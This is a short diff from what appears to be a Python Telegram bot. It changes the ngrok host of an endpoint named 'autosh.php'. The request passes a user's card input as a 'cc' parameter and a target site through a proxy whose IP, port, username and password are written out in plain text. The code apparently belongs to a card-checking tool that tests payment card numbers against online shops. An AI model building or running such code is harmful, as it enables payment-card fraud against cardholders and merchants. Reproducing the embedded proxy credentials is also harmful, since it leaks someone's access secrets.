@@ -2889,7 +2889,7 @@ async def sp(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     # API call
     api_url = (
-        f"https://feeef80303d.ngrok-free.app/autosh.php"
+        f"https://7feeef80303d.ngrok-free.app/autosh.php"
         f"?cc={card_input}&site={custom_url}&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
     )
     try:
